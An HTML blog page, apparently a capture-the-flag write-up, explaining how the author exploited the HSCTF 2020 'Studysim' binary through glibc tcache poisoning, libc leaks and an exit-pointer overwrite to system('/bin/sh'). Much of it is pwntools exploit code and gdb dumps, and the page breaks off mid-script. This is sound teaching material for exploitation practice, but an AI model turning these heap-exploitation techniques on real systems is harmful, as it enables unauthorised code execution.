@@ -1,0 +1,216 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         HSCTF 2020 Studysim Writeup
+        
+    </title><meta content="HSCTF 2020 Studysim Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/studysim/&t=HSCTF 2020 Studysim Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>HSCTF 2020 Studysim Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-06-04</time></div></div><section class=body><p>This is one the challenges I spent a lot of time on during this year's edition of HSCTF.<h2 id=tl-dr-of-the-challenge-binary>TL;DR OF THE CHALLENGE BINARY</h2><p>We've been given a standard 64 bit x86 Dynamically Linked binary along with Glibc 2.29 to begin with.<p>Here's what <em>Checksec</em> has to say<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>CANARY</span><span>    : ENABLED
+</span><span style=color:#ffb454>FORTIFY</span><span>   : disabled
+</span><span style=color:#ffb454>NX</span><span>        : ENABLED
+</span><span style=color:#ffb454>PIE</span><span>       : disabled
+</span><span style=color:#ffb454>RELRO</span><span>     : FULL
+</span><span>
+</span></code></pre><p>Let's dive into reversing now.<h2 id=reversing>REVERSING</h2><p>The binary is surprisingly easy to Reverse.<p>There's a standard CTF style menu driven code which has only two options , <strong>add</strong> and <strong>do</strong><ul><li><strong>ADD</strong> <ol><li>Checks whether the count of worksheets is equal to 7.<li>If count is not equal to 7 , it asks for size and checks if size is less than or equal to <strong>1024</strong>.<li>Finally it reads size number of bytes and stores the pointer on bss variable called <strong>stack</strong> at an offset of <em>allocated_count++</em>.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>( allocated_count </span><span style=color:#f29668>== </span><span style=color:#f29718>7 </span><span>)
+</span><span>  {
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Your workload is too high!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>else
+</span><span>  {
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"How long is your worksheet?"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ffb454>read_ulong</span><span>(</span><span style=color:#f29668>&</span><span>v1)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>( v1 </span><span style=color:#f29668><= </span><span style=color:#f29718>1024 </span><span>)
+</span><span>    {
+</span><span>      v2 </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(v1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!</span><span>v2 )
+</span><span>        </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"What's the content of your worksheet?"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ffb454>read_str</span><span>((</span><span style=font-style:italic;color:#39bae6>__int64</span><span>)v2</span><span style=color:#bfbab0cc>,</span><span> v1)</span><span style=color:#bfbab0cc>;
+</span><span>      stack[allocated_count</span><span style=color:#f29668>++</span><span>] </span><span style=color:#f29668>=</span><span> v2</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"You throw the worksheet '</span><span style=color:#f29718>%s</span><span style=color:#c2d94c>' on your stack of worksheets.</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> v2)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>else
+</span><span>    {
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Your worksheet is too long;"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span></code></pre><p>We can see that there are <strong>no bounded checks</strong> for the maximum allocated_count which is a potential bug.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>( allocated_count </span><span style=color:#f29668>== </span><span style=color:#f29718>7 </span><span>)              
+</span></code></pre><ul><li><strong>DO</strong> <ol><li>This function just asks for how many worksheets we would like to finish and subtracts the <strong>allocated_count</strong> with the number that we give as input.<li>There are no checks here and hence allocated count can become a negetive number too.<li>Finally it prints the allocated_count.</ol></ul><p>This lets us add chunks anywhere in memory but first we need leaks to go ahead.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ffb454>puts</span><span>(</span><span style=color:#c2d94c>"How many worksheets would you like to finish?"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>read_ulong</span><span>((</span><span style=color:#ff7733>unsigned </span><span style=font-style:italic;color:#39bae6>__int64 </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29668>&</span><span>v1)</span><span style=color:#bfbab0cc>;
+</span><span>  allocated_count </span><span style=color:#f29668>-=</span><span> v1</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"You did </span><span style=color:#f29718>%lu</span><span style=color:#c2d94c> worksheets. Only </span><span style=color:#f29718>%ld</span><span style=color:#c2d94c> more to go!</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> v1</span><span style=color:#bfbab0cc>,</span><span> allocated_count)</span><span style=color:#bfbab0cc>;
+</span><span>
+</span></code></pre><p>This is it for Reversing , let's head on to converting the bugs that we found into primitives.<h2 id=exploit-development-and-analysis>EXPLOIT DEVELOPMENT AND ANALYSIS</h2><p>Initially we kind of got stuck as to how we could leak , but then , Heap Leak can be easily extracted by simply allocating a chunk at <strong>allocated_count</strong>.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span style=color:#ff7733>from </span><span>time </span><span style=color:#ff7733>import </span><span>sleep
+</span><span>
+</span><span>LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span>)
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>'pwn.hsctf.com'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>5007</span><span>)
+</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
+</span><span>    context</span><span style=color:#f29668>.</span><span>log_level</span><span style=color:#f29668>=</span><span style=color:#c2d94c>"CRITICAL"
+</span><span style=color:#ff7733>else</span><span>:
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./studysim'</span><span>)</span><span style=font-style:italic;color:#5c6773>#,env = {"LD_PRELOAD" : "./libc.so.6"})
+</span><span>
+</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
+</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
+</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
+</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>size</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>content</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'add'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'your worksheet?</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'your worksheet?</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span>content)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>do_work</span><span>(</span><span style=color:#f29718>num</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'do'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'like to finish?</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(num))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>exit</span><span>():
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'sleep'</span><span>)
+</span><span>
+</span><span>stack </span><span style=color:#f29668>= </span><span style=color:#f29718>0x404060
+</span><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x1ff</span><span>)
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(</span><span style=color:#f29718>5</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x300</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Heap
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'Only '</span><span>)
+</span><span>    heap </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>8</span><span>)</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>10</span><span>)
+</span><span>    heap_base </span><span style=color:#f29668>= </span><span>heap </span><span style=color:#f29668>- </span><span style=color:#f29718>0x470
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap_base = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span></code></pre><p>From now on , we'll examine memory at each step.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0x404020 </span><span style=color:#f29668><</span><span>stdout@@GLIBC_2.2.5</span><span style=color:#f29668>></span><span>:	0x00007f04c9aa6760	0x0000000000000000
+</span><span style=color:#ffb454>0x404030 </span><span style=color:#f29668><</span><span>stdin@@GLIBC_2.2.5</span><span style=color:#f29668>></span><span>:	0x00007f04c9aa5a00	0x0000000000000000
+</span><span style=color:#ffb454>0x404040 </span><span style=color:#f29668><</span><span>allocated_count</span><span style=color:#f29668>></span><span>:	0x0000000000405470	0x0000000000000000
+</span><span style=color:#ffb454>0x404050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x404060 </span><span style=color:#f29668><</span><span>stack</span><span style=color:#f29668>></span><span>:	0x0000000000405260	0x0000000000000000
+</span><span style=color:#ffb454>0x404070 </span><span style=color:#f29668><</span><span>stack+16</span><span style=color:#f29668>></span><span>:	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x404080 </span><span style=color:#f29668><</span><span>stack+32</span><span style=color:#f29668>></span><span>:	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x404090 </span><span style=color:#f29668><</span><span>stack+48</span><span style=color:#f29668>></span><span>:	0x0000000000000000	0x0000000000000000
+</span><span>
+</span></code></pre><p>As u can see <strong>allocated_count</strong> has been overwritten with a heap address and there goes our heap leak.<p>Initially , I thought since file pointers are buffered on bss , it could be file structure exploitaion , but then I dropped the idea for several reasons I'll discuss in a moment.<p>A heap leak is kind of a light of hope as now we can offset to heap and stuff on tcache thereby fooling malloc to assume that they're free chunks.<p>As we can get allocation on tcache , we can overwrite <strong>fd</strong> of our allocated chunk to point to wherever we want.<p>We still dont have libc leak :(, hence our first aim is to get libc leak. To do that , we have our potential candidates in bss , yes , you guessed it right , the file pointers in bss.<p>Here's what we're upto right now -><ol><li>Get allocation on tcache , overwrite fd of one chunk and finally get the pointer to libc to leak it out.<li>We need to setup our allocated_count in such a way that we can offset to our desired tcache with <strong>stack[allocated_count++</strong>].</ol><p>To offset to tcache , we call <strong>do_worksheet</strong> and change our allocated_count to -><p>allocated_count - (tcache-stack)/8 {: .notice}<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>stack </span><span style=color:#f29668>= </span><span style=color:#f29718>0x404060
+</span><span>tcache </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x248  </span><span style=font-style:italic;color:#5c6773>#Corresponds to tcache of 0x400
+</span><span>allocated_count </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x470
+</span><span>offset </span><span style=color:#f29668>= </span><span>(tcache </span><span style=color:#f29668>- </span><span>stack)</span><span style=color:#f29668>/</span><span style=color:#f29718>8 
+</span><span>change </span><span style=color:#f29668>= </span><span>allocated_count </span><span style=color:#f29668>- </span><span>offset
+</span><span style=color:#ffb454>do_work</span><span>(change)
+</span><span>
+</span></code></pre><p>This will subtract our allocated count with <strong>change</strong> and hence when the next allocation happens , we get allocation on tcache. You can play around with the offset calculation if you didnt get it yet , its not that tough to understand :).<p>We now change the fd of our allocated chunk and then get back the libc pointer whose data we can leak.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>   </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x400</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p32</span><span>(</span><span style=color:#f29718>0x404030</span><span>))
+</span><span>   </span><span style=color:#ffb454>do_work</span><span>(offset</span><span style=color:#f29668>+</span><span style=color:#f29718>0x5</span><span>)
+</span></code></pre><p>We change the allocated_count back to negetive 4 so that we get next allocation on <strong>allocated_count</strong> itself and repeat the above process to get allocation on another tcache.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>) </span><span style=font-style:italic;color:#5c6773>#Get allocation on allocated count
+</span><span>    allocated_count_new1 </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xb91
+</span><span>    tcache_new </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x148  </span><span style=font-style:italic;color:#5c6773>#This time target another tcache of 0x200
+</span><span>    offset_new </span><span style=color:#f29668>= </span><span>(tcache_new </span><span style=color:#f29668>- </span><span>stack)</span><span style=color:#f29668>/</span><span style=color:#f29718>8
+</span><span>    k </span><span style=color:#f29668>= </span><span>allocated_count_new1 </span><span style=color:#f29668>- </span><span>offset_new
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(k)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x404030</span><span>))
+</span></code></pre><p>As u can see , tcache of 0x200 and 0x400 are successfully populated with our pointers.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0x405000:</span><span>	0x0000000000000000	0x0000000000000251
+</span><span style=color:#ffb454>0x405010:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405020:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405030:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405040:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405060:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405070:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405080:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405090:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050d0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405100:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405110:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405120:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405130:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405140:</span><span>	0x0000000000000000	0x0000000000405da0 -</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x200 tcache
+</span><span style=color:#ffb454>0x405150:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405160:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405170:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405180:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405190:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051d0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405200:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405210:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405220:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405230:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405240:</span><span>	0x0000000000000000	0x0000000000405780 -</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x400 tcache
+</span><span>
+</span></code></pre><p>Since fd of our tcache is overwritten with bss libc pointer , we can get allocation on bss by calling malloc twice from now and subsequently leak libc.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
+</span><span>    </span><span style=color:#ffb454>add</span><span>(0x400,p64(0x60))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(0x400,p8(0x60))
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Libc
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>"You throw the worksheet '"</span><span>)
+</span><span>    </span><span style=color:#ffb454>libc_base</span><span> = u64(re(6) </span><span style=color:#ffb454>+ </span><span style=color:#c2d94c>'\x00'</span><span style=color:#f29668>*</span><span>2) </span><span style=color:#ffb454>-</span><span> 0x1e4a60
+</span><span>    </span><span style=color:#ffb454>log.info</span><span>(</span><span style=color:#c2d94c>"libc = "</span><span> + hex(libc_base))
+</span><span>    </span><span style=color:#ffb454>system</span><span> = libc_base + LIBC.symbols</span><span style=color:#ff7733>[</span><span style=color:#c2d94c>'system'</span><span style=color:#ff7733>]
+</span><span>
+</span></code></pre><p>Let's see where all this has got us.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
+</span><span style=color:#ffb454>0x405000:</span><span>	0x0000000000000000	0x0000000000000251
+</span><span style=color:#ffb454>0x405010:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405020:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405030:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405040:</span><span>	0x0000000000000000	0xfe00000000000000
+</span><span style=color:#ffb454>0x405050:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405060:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405070:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405080:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405090:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050d0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4050f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405100:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405110:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405120:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405130:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>gdb-peda$ 
+</span><span style=color:#ffb454>0x405140:</span><span>	0x0000000000000000	0x0000000000405da0
+</span><span style=color:#ffb454>0x405150:</span><span>	0x0000000000405780	0x0000000000404030
+</span><span style=color:#ffb454>0x405160:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405170:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405180:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405190:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051a0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051b0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051c0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051d0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051e0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x4051f0:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405200:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405210:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405220:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405230:</span><span>	0x0000000000000000	0x0000000000000000
+</span><span style=color:#ffb454>0x405240:</span><span>	0x0000000000000000	0x00007f1f747c1a00 -</span><span style=color:#f29668>></span><span> There u go , we unlinked our stdin file structure , next allocation should return our file structure.
+</span><span>
+</span></code></pre><p>From now on , things seeemed clear but turned out they weren't.<ol><li>File structure overwrite , but one_gadget constraints were not satisfying anywhere.<li>Tried overwriting <strong>malloc hook</strong> and again one_gadget constraints were not satisfying.</ol><p>At this point , I was super frustrated , and then gave a thought , and <strong>exit pointer</strong> came to my mind like lightning.<p>So overwrote exit pointer with one_gadget , but there also the constraints were very stubborn.<p>There I observed something , when there was a call to exit_pointer , rdi was set to a libc bss address but it was very far from exit pointer's address.<p>Then I tried doing 2 overwrites ,<ol><li>Overwrite <strong>exit_pointer</strong> with <strong>system</strong>.<li>Overwrite libc bss pointer with "/bin/sh".</ol><p>And it worked!!!<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
+</span><span>    target </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x218968 </span><span style=font-style:italic;color:#5c6773>#rdi was set to this address
+</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_2_1_stdin_'</span><span>]) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(offset_new</span><span style=color:#f29668>-</span><span style=color:#f29718>2</span><span>))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x200</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>))
+</span><span>    </span><span style=color:#ffb454>do_work</span><span>(offset_new</span><span style=color:#f29668>+</span><span style=color:#f29718>4</span><span>)
